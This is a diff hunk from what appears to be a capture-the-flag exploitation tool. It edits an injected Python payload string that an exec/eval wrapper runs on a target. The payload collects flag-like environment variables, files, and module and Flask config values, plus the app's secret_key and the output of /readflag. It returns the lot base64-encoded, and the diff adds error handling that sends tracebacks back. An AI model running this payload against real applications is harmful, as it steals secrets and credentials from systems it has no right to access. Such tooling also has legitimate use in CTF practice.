@@ -315,33 +315,38 @@ BRAINROT_VARNAMES = [
 
 GETFLAG_CODE = """
 def f():
-    import os,pathlib,base64,json,re
-    flag_re = re.compile(r"\\{\\S{2,100}\\}")
-    data = {}
-    data["environ"] = {k:v for k,v in os.environ.items() if flag_re.search(v)}
-    data["files"] = {
-        path.as_posix(): text
-        for dir in [".", "/"]
-        for path in pathlib.Path(dir).glob('f*')
-        if path.is_file() and os.access(path, os.R_OK)
-        for text in [path.read_text()]
-        if len(text) < 200 and flag_re.search(text)
-    }
-    main = __import__("__main__").__dict__
-    data["vars"] = {
-        k: v
-        for d in [
-            main,
-            main.get("app",{}).__dict__.get("config"),
-        ]
-        if d
-        for k, v in d.items()
-        if isinstance(v, str) and flag_re.search(v)
-    }
-    readflag = pathlib.Path("/readflag")
-    data["readflag"] = os.popen("/readflag").read() if readflag.exists() and os.access(readflag, os.X_OK) else None
-    data["secert_key"] = main.get("app",{}).__dict__.get("secret_key")
-    return "start"+base64.b64encode(json.dumps(data).encode()).decode()+"stop"
+    try:
+        import os,pathlib,base64,json,re
+        flag_re = re.compile(r"\\{\\S{2,100}\\}")
+        data = {}
+        data["environ"] = {k:v for k,v in os.environ.items() if flag_re.search(v)}
+        data["files"] = {
+            path.as_posix(): text
+            for dir in [".", "/"]
+            for path in pathlib.Path(dir).glob('f*')
+            if path.is_file() and os.access(path, os.R_OK)
+            for text in [path.read_text()]
+            if len(text) < 200 and flag_re.search(text)
+        }
+        main = __import__("__main__").__dict__
+        data["vars"] = {
+            k: v
+            for d in [
+                main,
+                main.get("app",os).__dict__.get("config"),
+            ]
+            if d
+            for k, v in d.items()
+            if isinstance(v, str) and flag_re.search(v)
+        }
+        readflag = pathlib.Path("/readflag")
+        data["readflag"] = os.popen("/readflag").read() if readflag.exists() and os.access(readflag, os.X_OK) else None
+        data["secert_key"] = main.get("app",os).__dict__.get("secret_key")
+        return "start"+base64.b64encode(json.dumps(data).encode()).decode()+"stop"
+    except Exception:
+        import traceback
+        return traceback.format_exc()
+    
 """
 
 GETFLAG_CODE_EVAL = f"[exec({GETFLAG_CODE!r}),f()][-1]"
